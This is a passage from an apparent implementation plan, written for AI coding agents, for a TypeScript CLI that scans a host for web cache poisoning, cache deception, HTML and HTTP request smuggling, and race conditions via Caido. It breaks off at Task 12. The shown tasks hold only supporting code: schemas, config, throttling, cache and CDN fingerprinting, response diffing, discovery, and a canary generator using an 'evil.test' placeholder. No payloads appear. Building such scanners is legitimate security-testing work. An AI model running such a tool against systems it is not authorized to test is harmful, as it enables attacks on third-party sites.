# caido-cache-smug Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a standalone TypeScript CLI that sweeps Caido-captured requests for a single host across cache poisoning, cache deception, HTML smuggling, (flag-gated) HTTP request smuggling, and (flag-gated) HTTP/2 race conditions, emitting machine + human reports.

**Architecture:** Single-process Node 20+ CLI. Discovery via Caido GraphQL (`@caido/sdk-client`) using HTTPQL host filter, then per-endpoint baseline fetch, then five parallel module sweeps under a global token-bucket rate limiter. All active sends route through `caido_send_request` so traffic is replayable in Caido (Modules D and E use raw sockets / raw HTTP/2 out of necessity — Module D for byte-level framing, Module E for sub-millisecond send-coalescing). Output as `findings.json` (zod-validated) and `report.md`.

**Tech Stack:** TypeScript 5.4+, Node 20+, `@caido/sdk-client`, `commander`, `undici`, `pino`, `zod`, `vitest`.

**Spec:** [SPEC.md](SPEC.md)

---

## File Structure

```
caido-cache-smug/
├── package.json
├── tsconfig.json
├── vitest.config.ts
├── .gitignore
├── .env.example
├── README.md
├── src/
│   ├── cli.ts                       # CLI entry, arg parse, dispatch
│   ├── types.ts                     # Endpoint, Probe, Finding, Confidence
│   ├── config.ts                    # zod schema for CLI config + env
│   ├── caido/
│   │   ├── client.ts                # @caido/sdk-client wrapper
│   │   ├── discover.ts              # list_requests, HTTPQL host filter, dedupe
│   │   └── send.ts                  # send_request wrapper + rate limit
│   ├── core/
│   │   ├── throttle.ts              # token-bucket
│   │   ├── diff.ts                  # response diff
│   │   ├── cdn.ts                   # CDN fingerprint
│   │   ├── marker.ts                # user-marker extraction
│   │   ├── cache.ts                 # cache-header parse
│   │   └── rand.ts                  # canary / cb generators
│   ├── modules/
│   │   ├── cache_poison/
│   │   │   ├── index.ts
│   │   │   ├── unkeyed_header.ts
│   │   │   ├── param_cloaking.ts
│   │   │   ├── url_parser.ts
│   │   │   ├── cf_header_overflow.ts
│   │   │   ├── cdn_quirks.ts
│   │   │   └── persistence_loop.ts
│   │   ├── cache_deception/
│   │   │   ├── index.ts
│   │   │   ├── path_append.ts
│   │   │   ├── delimiter.ts
│   │   │   ├── cache_buster_param.ts
│   │   │   ├── traversal_in_key.ts
│   │   │   └── cspt_passive.ts
│   │   ├── html_smuggling/
│   │   │   ├── index.ts
│   │   │   ├── blob_download.ts
│   │   │   ├── form_attr.ts
│   │   │   ├── url_credential.ts
│   │   │   └── data_type.ts
│   │   ├── smuggling/
│   │   │   ├── index.ts
│   │   │   ├── raw_socket.ts
│   │   │   ├── h2_downgrade.ts
│   │   │   ├── cl_te.ts
│   │   │   ├── te_cl.ts
│   │   │   ├── te_te.ts
│   │   │   └── hop_by_hop.ts
│   │   └── race/
│   │       ├── index.ts
│   │       ├── candidate.ts
│   │       ├── single_packet.ts
│   │       ├── last_byte.ts
│   │       └── detect.ts
│   └── report/
│       ├── findings.ts
│       ├── markdown.ts
│       └── poc.ts
├── data/
│   ├── unkeyed_headers.json
│   ├── url_parser_suffixes.json
│   ├── delimiters.json
│   ├── static_extensions.json
│   ├── cdn_fingerprints.json
│   └── race_keywords.json
└── tests/
    ├── fixtures/                    # captured req/resp pairs
    ├── unit/                        # one file per src/* module
    └── integration/                 # mock Caido + mock target
```

---

## Task 1: Project scaffold

**Files:**
- Create: `package.json`, `tsconfig.json`, `vitest.config.ts`, `.gitignore`, `.env.example`

- [ ] **Step 1: Create `package.json`**

```json
{
  "name": "caido-cache-smug",
  "version": "0.1.0",
  "type": "module",
  "bin": { "caido-cache-smug": "./dist/cli.js" },
  "scripts": {
    "build": "tsc -p tsconfig.json",
    "dev": "tsx src/cli.ts",
    "test": "vitest run",
    "test:watch": "vitest"
  },
  "dependencies": {
    "@caido/sdk-client": "^0.5.0",
    "commander": "^12.0.0",
    "undici": "^6.0.0",
    "pino": "^9.0.0",
    "zod": "^3.23.0"
  },
  "devDependencies": {
    "@types/node": "^20.0.0",
    "tsx": "^4.0.0",
    "typescript": "^5.4.0",
    "vitest": "^1.6.0"
  },
  "engines": { "node": ">=20" }
}
```

- [ ] **Step 2: Create `tsconfig.json`**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "Bundler",
    "outDir": "dist",
    "rootDir": "src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "resolveJsonModule": true,
    "declaration": false,
    "sourceMap": true
  },
  "include": ["src/**/*"]
}
```

- [ ] **Step 3: Create `vitest.config.ts`**

```ts
import { defineConfig } from "vitest/config";

export default defineConfig({
  test: {
    include: ["tests/**/*.test.ts"],
    environment: "node",
    coverage: { reporter: ["text", "html"] }
  }
});
```

- [ ] **Step 4: Create `.gitignore`**

```
node_modules/
dist/
out/
.env
*.log
.DS_Store
```

- [ ] **Step 5: Create `.env.example`**

```
CAIDO_API_TOKEN=
CAIDO_URL=http://localhost:8080
```

- [ ] **Step 6: Install dependencies**

Run: `cd caido-cache-smug && npm install`
Expected: `node_modules/` created, no errors.

- [ ] **Step 7: Commit**

```bash
cd caido-cache-smug && git add . && git commit -m "feat: scaffold caido-cache-smug project"
```

---

## Task 2: Core types

**Files:**
- Create: `src/types.ts`
- Test: `tests/unit/types.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/types.test.ts
import { describe, it, expect } from "vitest";
import { FindingSchema, ConfidenceSchema, ModuleSchema } from "../../src/types";

describe("FindingSchema", () => {
  it("accepts a well-formed finding", () => {
    const valid = {
      id: "cp-001",
      module: "cache-poison",
      subtype: "unkeyed-header",
      endpoint: "GET /en/index",
      primitive: { header: "X-Forwarded-Host" },
      confidence: "high",
      evidence: { baseline_id: "raw/baselines/8f.json", probe_id: "raw/probes/91.json" },
      poc_curl: "curl -H ...",
      wiki_ref: "wiki/techniques/cache-poisoning/unkeyed-header.md"
    };
    expect(() => FindingSchema.parse(valid)).not.toThrow();
  });

  it("rejects invalid confidence", () => {
    expect(() => ConfidenceSchema.parse("bogus")).toThrow();
  });

  it("rejects unknown module", () => {
    expect(() => ModuleSchema.parse("xss")).toThrow();
  });
});
```

- [ ] **Step 2: Run test, expect fail**

Run: `npm test -- tests/unit/types.test.ts`
Expected: FAIL with cannot find module `src/types`.

- [ ] **Step 3: Write `src/types.ts`**

```ts
import { z } from "zod";

export const ConfidenceSchema = z.enum(["high", "medium", "low", "lead"]);
export type Confidence = z.infer<typeof ConfidenceSchema>;

export const ModuleSchema = z.enum([
  "cache-poison",
  "cache-deception",
  "html-smuggling",
  "smuggling"
]);
export type Module = z.infer<typeof ModuleSchema>;

export const EndpointSchema = z.object({
  id: z.string(),
  method: z.string(),
  host: z.string(),
  path: z.string(),
  query: z.record(z.string()).default({}),
  caido_request_id: z.string()
});
export type Endpoint = z.infer<typeof EndpointSchema>;

export const HttpMessageSchema = z.object({
  method: z.string().optional(),
  url: z.string().optional(),
  status: z.number().optional(),
  headers: z.record(z.string()),
  body: z.string()
});
export type HttpMessage = z.infer<typeof HttpMessageSchema>;

export const FindingSchema = z.object({
  id: z.string(),
  module: ModuleSchema,
  subtype: z.string(),
  endpoint: z.string(),
  primitive: z.record(z.any()),
  confidence: ConfidenceSchema,
  evidence: z.record(z.any()),
  poc_curl: z.string(),
  wiki_ref: z.string()
});
export type Finding = z.infer<typeof FindingSchema>;

export const RunMetaSchema = z.object({
  host: z.string(),
  ts: z.string(),
  duration_ms: z.number(),
  endpoints_probed: z.number(),
  probes_sent: z.number(),
  modules_run: z.array(ModuleSchema),
  interrupted: z.boolean().default(false)
});
export type RunMeta = z.infer<typeof RunMetaSchema>;
```

- [ ] **Step 4: Run test, expect pass**

Run: `npm test -- tests/unit/types.test.ts`
Expected: 3 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/types.ts tests/unit/types.test.ts && git commit -m "feat(types): zod schemas for Finding, Endpoint, RunMeta"
```

---

## Task 3: Config schema

**Files:**
- Create: `src/config.ts`
- Test: `tests/unit/config.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/config.test.ts
import { describe, it, expect } from "vitest";
import { parseConfig } from "../../src/config";

describe("parseConfig", () => {
  it("requires --host", () => {
    expect(() => parseConfig({}, {})).toThrow(/host/);
  });

  it("uses CAIDO_API_TOKEN env when --caido-token missing", () => {
    const cfg = parseConfig({ host: "x.test" }, { CAIDO_API_TOKEN: "tk" });
    expect(cfg.caidoToken).toBe("tk");
  });

  it("errors when no token anywhere", () => {
    expect(() => parseConfig({ host: "x.test" }, {})).toThrow(/token/);
  });

  it("defaults rps to 5", () => {
    const cfg = parseConfig({ host: "x.test", caidoToken: "tk" }, {});
    expect(cfg.rps).toBe(5);
  });

  it("smuggling module requires aggressiveSmuggling flag", () => {
    expect(() =>
      parseConfig(
        { host: "x.test", caidoToken: "tk", modules: ["smuggling"] },
        {}
      )
    ).toThrow(/aggressive/);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/config.test.ts`
Expected: FAIL, module not found.

- [ ] **Step 3: Write `src/config.ts`**

```ts
import { z } from "zod";
import { ModuleSchema } from "./types.js";

const RawConfigSchema = z.object({
  host: z.string().min(1, "--host is required"),
  caidoUrl: z.string().url().default("http://localhost:8080"),
  caidoToken: z.string().min(1, "Caido token required"),
  project: z.string().optional(),
  maxRequests: z.number().int().positive().default(500),
  rps: z.number().positive().default(5),
  out: z.string().optional(),
  passiveOnly: z.boolean().default(false),
  modules: z.array(ModuleSchema).default(["cache-poison", "cache-deception", "html-smuggling"]),
  authCookie: z.string().optional(),
  aggressiveSmuggling: z.boolean().default(false),
  collaborator: z.string().optional()
});

export type RuntimeConfig = z.infer<typeof RawConfigSchema>;

export function parseConfig(
  args: Record<string, unknown>,
  env: NodeJS.ProcessEnv
): RuntimeConfig {
  const merged = {
    ...args,
    caidoToken: args.caidoToken ?? env.CAIDO_API_TOKEN,
    caidoUrl: args.caidoUrl ?? env.CAIDO_URL ?? "http://localhost:8080"
  };
  const cfg = RawConfigSchema.parse(merged);

  if (cfg.modules.includes("smuggling") && !cfg.aggressiveSmuggling) {
    throw new Error("smuggling module requires --aggressive-smuggling flag");
  }
  return cfg;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/config.test.ts`
Expected: 5 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/config.ts tests/unit/config.test.ts && git commit -m "feat(config): zod-validated CLI config + env fallback"
```

---

## Task 4: Random / canary generators

**Files:**
- Create: `src/core/rand.ts`
- Test: `tests/unit/rand.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/rand.test.ts
import { describe, it, expect } from "vitest";
import { canary, cacheBuster, randHex } from "../../src/core/rand";

describe("rand", () => {
  it("canary returns unique subdomain pattern", () => {
    const a = canary();
    const b = canary();
    expect(a).toMatch(/^cnry-[a-z0-9]{8}\.evil\.test$/);
    expect(a).not.toBe(b);
  });

  it("cacheBuster returns 8-hex string", () => {
    expect(cacheBuster()).toMatch(/^[a-f0-9]{8}$/);
  });

  it("randHex(n) returns hex of length n", () => {
    expect(randHex(16)).toMatch(/^[a-f0-9]{16}$/);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/rand.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/core/rand.ts`**

```ts
import { randomBytes } from "node:crypto";

export function randHex(len: number): string {
  return randomBytes(Math.ceil(len / 2)).toString("hex").slice(0, len);
}

export function canary(): string {
  return `cnry-${randHex(8)}.evil.test`;
}

export function cacheBuster(): string {
  return randHex(8);
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/rand.test.ts`
Expected: 3 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/core/rand.ts tests/unit/rand.test.ts && git commit -m "feat(core): canary, cache-buster, randHex generators"
```

---

## Task 5: Token-bucket throttle

**Files:**
- Create: `src/core/throttle.ts`
- Test: `tests/unit/throttle.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/throttle.test.ts
import { describe, it, expect } from "vitest";
import { Throttle } from "../../src/core/throttle";

describe("Throttle", () => {
  it("admits N tokens immediately at start", async () => {
    const t = new Throttle({ rps: 10, burst: 5 });
    const start = Date.now();
    for (let i = 0; i < 5; i++) await t.acquire();
    expect(Date.now() - start).toBeLessThan(50);
  });

  it("paces beyond burst", async () => {
    const t = new Throttle({ rps: 10, burst: 2 });
    const start = Date.now();
    for (let i = 0; i < 4; i++) await t.acquire();
    expect(Date.now() - start).toBeGreaterThanOrEqual(180);
  });

  it("respects hard floor", async () => {
    const t = new Throttle({ rps: 100, burst: 1, hardFloorRps: 1 });
    const start = Date.now();
    await t.acquire();
    await t.acquire();
    expect(Date.now() - start).toBeGreaterThanOrEqual(900);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/throttle.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/core/throttle.ts`**

```ts
interface ThrottleOpts {
  rps: number;
  burst?: number;
  hardFloorRps?: number;
}

export class Throttle {
  private rps: number;
  private capacity: number;
  private tokens: number;
  private last: number;

  constructor(opts: ThrottleOpts) {
    this.rps = opts.hardFloorRps ? Math.min(opts.rps, opts.hardFloorRps) : opts.rps;
    this.capacity = opts.burst ?? Math.max(1, Math.floor(this.rps));
    this.tokens = this.capacity;
    this.last = Date.now();
  }

  async acquire(): Promise<void> {
    while (true) {
      this.refill();
      if (this.tokens >= 1) {
        this.tokens -= 1;
        return;
      }
      const waitMs = Math.ceil((1 - this.tokens) * (1000 / this.rps));
      await new Promise((r) => setTimeout(r, waitMs));
    }
  }

  private refill(): void {
    const now = Date.now();
    const elapsed = (now - this.last) / 1000;
    this.tokens = Math.min(this.capacity, this.tokens + elapsed * this.rps);
    this.last = now;
  }
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/throttle.test.ts`
Expected: 3 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/core/throttle.ts tests/unit/throttle.test.ts && git commit -m "feat(core): token-bucket throttle with burst + hard-floor"
```

---

## Task 6: Cache-header parser

**Files:**
- Create: `src/core/cache.ts`
- Test: `tests/unit/cache.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cache.test.ts
import { describe, it, expect } from "vitest";
import { parseCacheIndicators, hasCacheLayer } from "../../src/core/cache";

describe("cache indicators", () => {
  it("detects X-Cache HIT", () => {
    const i = parseCacheIndicators({ "x-cache": "HIT" });
    expect(i.hit).toBe(true);
  });
  it("detects CF-Cache-Status MISS + Age", () => {
    const i = parseCacheIndicators({ "cf-cache-status": "MISS", age: "12" });
    expect(i.hit).toBe(false);
    expect(i.age).toBe(12);
    expect(i.cdnFamily).toBe("cloudflare");
  });
  it("hasCacheLayer true when any indicator present", () => {
    expect(hasCacheLayer({ via: "1.1 varnish" })).toBe(true);
    expect(hasCacheLayer({})).toBe(false);
  });
  it("Cache-Control public flagged cacheable", () => {
    const i = parseCacheIndicators({ "cache-control": "public, max-age=3600" });
    expect(i.cacheable).toBe(true);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cache.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/core/cache.ts`**

```ts
export interface CacheIndicators {
  hit: boolean;
  age?: number;
  cacheable: boolean;
  cdnFamily?: "cloudflare" | "akamai" | "fastly" | "cloudfront" | "varnish" | "nginx";
  raw: Record<string, string>;
}

function lc(h: Record<string, string>): Record<string, string> {
  const o: Record<string, string> = {};
  for (const k of Object.keys(h)) o[k.toLowerCase()] = h[k];
  return o;
}

export function parseCacheIndicators(headers: Record<string, string>): CacheIndicators {
  const h = lc(headers);
  const hit =
    /HIT/i.test(h["x-cache"] ?? "") ||
    /HIT/i.test(h["cf-cache-status"] ?? "") ||
    /HIT/i.test(h["x-served-by"] ?? "") ||
    /HIT/i.test(h["x-akamai-cache-status"] ?? "");
  const age = h["age"] ? parseInt(h["age"], 10) : undefined;
  const cc = (h["cache-control"] ?? "").toLowerCase();
  const cacheable = /public/.test(cc) || /s-maxage/.test(cc) || age !== undefined;

  let cdnFamily: CacheIndicators["cdnFamily"];
  if (h["cf-ray"] || h["cf-cache-status"] || /cloudflare/i.test(h["server"] ?? "")) cdnFamily = "cloudflare";
  else if (h["x-akamai-request-id"] || /akamai/i.test(h["server"] ?? "")) cdnFamily = "akamai";
  else if (/fastly/i.test(h["x-served-by"] ?? "")) cdnFamily = "fastly";
  else if (h["x-amz-cf-id"]) cdnFamily = "cloudfront";
  else if (/varnish/i.test(h["via"] ?? "")) cdnFamily = "varnish";
  else if (/nginx/i.test(h["server"] ?? "")) cdnFamily = "nginx";

  return { hit, age, cacheable, cdnFamily, raw: h };
}

export function hasCacheLayer(headers: Record<string, string>): boolean {
  const i = parseCacheIndicators(headers);
  return (
    i.hit ||
    i.age !== undefined ||
    i.cacheable ||
    i.cdnFamily !== undefined ||
    /varnish|squid|nginx-cache/i.test(i.raw["via"] ?? "")
  );
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/cache.test.ts`
Expected: 4 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/core/cache.ts tests/unit/cache.test.ts && git commit -m "feat(core): cache-indicator parser + CDN family detection"
```

---

## Task 7: CDN fingerprint module

**Files:**
- Create: `src/core/cdn.ts`, `data/cdn_fingerprints.json`
- Test: `tests/unit/cdn.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/cdn.test.ts
import { describe, it, expect } from "vitest";
import { fingerprintCdn } from "../../src/core/cdn";

describe("fingerprintCdn", () => {
  it("detects Cloudflare via CF-Ray", () => {
    expect(fingerprintCdn({ "cf-ray": "abc-EWR" })).toBe("cloudflare");
  });
  it("detects Akamai via Server", () => {
    expect(fingerprintCdn({ server: "AkamaiGHost" })).toBe("akamai");
  });
  it("returns null when unknown", () => {
    expect(fingerprintCdn({ server: "WeirdProxy/1.0" })).toBeNull();
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/cdn.test.ts`
Expected: FAIL.

- [ ] **Step 3: Create `data/cdn_fingerprints.json`**

```json
{
  "cloudflare": { "headerKeys": ["cf-ray", "cf-cache-status"], "serverRegex": "cloudflare" },
  "akamai": { "headerKeys": ["x-akamai-request-id"], "serverRegex": "AkamaiGHost|AkamaiNetStorage" },
  "fastly": { "headerKeys": ["fastly-debug-digest"], "servedByRegex": "fastly" },
  "cloudfront": { "headerKeys": ["x-amz-cf-id", "x-amz-cf-pop"], "serverRegex": "CloudFront" },
  "varnish": { "headerKeys": ["x-varnish"], "viaRegex": "varnish" },
  "nginx": { "headerKeys": [], "serverRegex": "nginx" }
}
```

- [ ] **Step 4: Write `src/core/cdn.ts`**

```ts
import fp from "../../data/cdn_fingerprints.json" with { type: "json" };

export type CdnFamily = "cloudflare" | "akamai" | "fastly" | "cloudfront" | "varnish" | "nginx";

export function fingerprintCdn(headers: Record<string, string>): CdnFamily | null {
  const h: Record<string, string> = {};
  for (const k of Object.keys(headers)) h[k.toLowerCase()] = headers[k];

  for (const [family, def] of Object.entries(fp) as Array<[CdnFamily, any]>) {
    for (const hk of def.headerKeys ?? []) if (h[hk]) return family;
    if (def.serverRegex && new RegExp(def.serverRegex, "i").test(h["server"] ?? "")) return family;
    if (def.viaRegex && new RegExp(def.viaRegex, "i").test(h["via"] ?? "")) return family;
    if (def.servedByRegex && new RegExp(def.servedByRegex, "i").test(h["x-served-by"] ?? "")) return family;
  }
  return null;
}
```

- [ ] **Step 5: Run, expect pass**

Run: `npm test -- tests/unit/cdn.test.ts`
Expected: 3 tests pass.

- [ ] **Step 6: Commit**

```bash
git add src/core/cdn.ts data/cdn_fingerprints.json tests/unit/cdn.test.ts && git commit -m "feat(core): CDN family fingerprint via headers"
```

---

## Task 8: User-marker extractor

**Files:**
- Create: `src/core/marker.ts`
- Test: `tests/unit/marker.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/marker.test.ts
import { describe, it, expect } from "vitest";
import { extractMarkers } from "../../src/core/marker";

describe("extractMarkers", () => {
  it("finds email", () => {
    const m = extractMarkers("Welcome alice@example.com");
    expect(m).toContainEqual({ kind: "email", value: "alice@example.com" });
  });
  it("finds csrf in JSON", () => {
    const body = JSON.stringify({ csrf_token: "AAAAAAAAAAAAAAAAAAAAAA" });
    const m = extractMarkers(body);
    expect(m.find((x) => x.kind === "csrf")?.value).toBe("AAAAAAAAAAAAAAAAAAAAAA");
  });
  it("finds JSON user id", () => {
    const m = extractMarkers('{"id": 12345, "name": "alice"}');
    expect(m.find((x) => x.kind === "id")?.value).toBe("12345");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/marker.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/core/marker.ts`**

```ts
export interface Marker {
  kind: "email" | "csrf" | "id" | "username";
  value: string;
}

const EMAIL = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
const CSRF = /(?:csrf[_-]?token|_token|x-csrf-token)["'\s:=]+([A-Za-z0-9+/=_-]{16,})/gi;
const ID = /["']?id["']?\s*[:=]\s*["']?(\d{3,}|[a-f0-9-]{8,})/gi;
const USERNAME = /["']?username["']?\s*[:=]\s*["']([^"']{3,32})["']/gi;

export function extractMarkers(body: string): Marker[] {
  const out: Marker[] = [];
  for (const m of body.matchAll(EMAIL)) out.push({ kind: "email", value: m[0] });
  for (const m of body.matchAll(CSRF)) out.push({ kind: "csrf", value: m[1] });
  for (const m of body.matchAll(ID)) out.push({ kind: "id", value: m[1] });
  for (const m of body.matchAll(USERNAME)) out.push({ kind: "username", value: m[1] });
  return dedupe(out);
}

function dedupe(arr: Marker[]): Marker[] {
  const seen = new Set<string>();
  return arr.filter((m) => {
    const k = `${m.kind}:${m.value}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/marker.test.ts`
Expected: 3 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/core/marker.ts tests/unit/marker.test.ts && git commit -m "feat(core): user marker extraction (email/csrf/id/username)"
```

---

## Task 9: Response diff

**Files:**
- Create: `src/core/diff.ts`
- Test: `tests/unit/diff.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/diff.test.ts
import { describe, it, expect } from "vitest";
import { diffResponses, bodyParity } from "../../src/core/diff";

describe("diff", () => {
  it("flags status change", () => {
    const d = diffResponses({ status: 200, headers: {}, body: "" }, { status: 302, headers: {}, body: "" });
    expect(d.statusChanged).toBe(true);
  });
  it("computes body parity", () => {
    expect(bodyParity("aaaaaaaaaa", "aaaaaaaaaa")).toBe(1);
    expect(bodyParity("aaaaaaaaaa", "bbbbbbbbbb")).toBeLessThan(0.5);
  });
  it("respects ignore_body_regex", () => {
    const d = diffResponses(
      { status: 200, headers: {}, body: '{"t":1}' },
      { status: 200, headers: {}, body: '{"t":2}' },
      { ignoreBodyRegex: [/"t":\d+/] }
    );
    expect(d.bodyChanged).toBe(false);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/diff.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/core/diff.ts`**

```ts
import type { HttpMessage } from "../types.js";

export interface DiffOpts {
  ignoreHeaders?: string[];
  ignoreBodyRegex?: RegExp[];
}
export interface DiffResult {
  statusChanged: boolean;
  headersAdded: string[];
  headersRemoved: string[];
  bodyChanged: boolean;
  bodyParity: number;
}

export function bodyParity(a: string, b: string): number {
  if (a === b) return 1;
  const longer = a.length >= b.length ? a : b;
  const shorter = a.length >= b.length ? b : a;
  if (longer.length === 0) return 1;
  let same = 0;
  for (let i = 0; i < shorter.length; i++) if (longer[i] === shorter[i]) same++;
  return same / longer.length;
}

function normalize(body: string, ignore: RegExp[] = []): string {
  let s = body;
  for (const r of ignore) s = s.replace(new RegExp(r, "g"), "");
  return s;
}

export function diffResponses(a: HttpMessage, b: HttpMessage, opts: DiffOpts = {}): DiffResult {
  const aBody = normalize(a.body, opts.ignoreBodyRegex);
  const bBody = normalize(b.body, opts.ignoreBodyRegex);
  const ignore = new Set((opts.ignoreHeaders ?? []).map((h) => h.toLowerCase()));
  const ak = Object.keys(a.headers).filter((k) => !ignore.has(k.toLowerCase()));
  const bk = Object.keys(b.headers).filter((k) => !ignore.has(k.toLowerCase()));
  return {
    statusChanged: a.status !== b.status,
    headersAdded: bk.filter((k) => !ak.includes(k)),
    headersRemoved: ak.filter((k) => !bk.includes(k)),
    bodyChanged: aBody !== bBody,
    bodyParity: bodyParity(aBody, bBody)
  };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/diff.test.ts`
Expected: 3 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/core/diff.ts tests/unit/diff.test.ts && git commit -m "feat(core): response diff + body-parity score"
```

---

## Task 10: Caido client wrapper

**Files:**
- Create: `src/caido/client.ts`
- Test: `tests/unit/caido_client.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/caido_client.test.ts
import { describe, it, expect, vi } from "vitest";
import { CaidoClient } from "../../src/caido/client";

describe("CaidoClient", () => {
  it("builds Authorization header from PAT", () => {
    const c = new CaidoClient({ url: "http://localhost:8080", token: "tok-123" });
    expect(c.authHeader()).toBe("Bearer tok-123");
  });

  it("throws on missing token", () => {
    // @ts-expect-error
    expect(() => new CaidoClient({ url: "http://x" })).toThrow(/token/);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/caido_client.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/caido/client.ts`**

```ts
import { request } from "undici";

export interface CaidoClientOpts {
  url: string;
  token: string;
}

export class CaidoClient {
  private url: string;
  private token: string;

  constructor(opts: CaidoClientOpts) {
    if (!opts.token) throw new Error("Caido token required");
    this.url = opts.url.replace(/\/$/, "");
    this.token = opts.token;
  }

  authHeader(): string {
    return `Bearer ${this.token}`;
  }

  async graphql<T>(query: string, variables: Record<string, unknown> = {}): Promise<T> {
    const res = await request(`${this.url}/graphql`, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: this.authHeader()
      },
      body: JSON.stringify({ query, variables })
    });
    if (res.statusCode >= 400) throw new Error(`Caido GraphQL ${res.statusCode}`);
    const json = (await res.body.json()) as { data?: T; errors?: unknown };
    if (json.errors) throw new Error(`Caido GraphQL errors: ${JSON.stringify(json.errors)}`);
    return json.data as T;
  }
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/caido_client.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/caido/client.ts tests/unit/caido_client.test.ts && git commit -m "feat(caido): GraphQL client with PAT auth"
```

---

## Task 11: Discovery (HTTPQL host filter + dedupe)

**Files:**
- Create: `src/caido/discover.ts`
- Test: `tests/unit/discover.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/discover.test.ts
import { describe, it, expect } from "vitest";
import { dedupeEndpoints, buildHostQuery } from "../../src/caido/discover";

describe("discover helpers", () => {
  it("buildHostQuery returns HTTPQL string", () => {
    expect(buildHostQuery("api.acme.test")).toBe('req.host.cont:"api.acme.test"');
  });
  it("dedupe by method + path + sorted query keys", () => {
    const reqs = [
      { id: "1", method: "GET", host: "x", path: "/a", query: { a: "1", b: "2" }, caido_request_id: "1" },
      { id: "2", method: "GET", host: "x", path: "/a", query: { b: "5", a: "9" }, caido_request_id: "2" },
      { id: "3", method: "GET", host: "x", path: "/b", query: {}, caido_request_id: "3" }
    ];
    const out = dedupeEndpoints(reqs);
    expect(out).toHaveLength(2);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/discover.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/caido/discover.ts`**

```ts
import type { Endpoint } from "../types.js";
import type { CaidoClient } from "./client.js";

export function buildHostQuery(host: string): string {
  return `req.host.cont:"${host}"`;
}

export function dedupeEndpoints(endpoints: Endpoint[]): Endpoint[] {
  const seen = new Set<string>();
  const out: Endpoint[] = [];
  for (const e of endpoints) {
    const qk = Object.keys(e.query).sort().join(",");
    const key = `${e.method} ${e.host} ${e.path} ${qk}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(e);
  }
  return out;
}

const LIST_QUERY = `
  query ListRequests($filter: String!, $first: Int!) {
    requests(filter: $filter, first: $first) {
      edges { node { id method host path query } }
    }
  }
`;

interface RawEdge { node: { id: string; method: string; host: string; path: string; query: string } }

export async function discoverEndpoints(
  client: CaidoClient,
  host: string,
  max: number
): Promise<Endpoint[]> {
  const data = await client.graphql<{ requests: { edges: RawEdge[] } }>(LIST_QUERY, {
    filter: buildHostQuery(host),
    first: max
  });
  const raw: Endpoint[] = data.requests.edges.map((e) => ({
    id: e.node.id,
    method: e.node.method,
    host: e.node.host,
    path: e.node.path,
    query: parseQuery(e.node.query),
    caido_request_id: e.node.id
  }));
  return dedupeEndpoints(raw);
}

function parseQuery(q: string): Record<string, string> {
  if (!q) return {};
  const out: Record<string, string> = {};
  for (const part of q.replace(/^\?/, "").split("&")) {
    if (!part) continue;
    const [k, v = ""] = part.split("=");
    out[decodeURIComponent(k)] = decodeURIComponent(v);
  }
  return out;
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/discover.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/caido/discover.ts tests/unit/discover.test.ts && git commit -m "feat(caido): host-filtered discovery + dedupe"
```

---

## Task 12: Send wrapper with throttle

**Files:**
- Create: `src/caido/send.ts`
- Test: `tests/unit/send.test.ts`

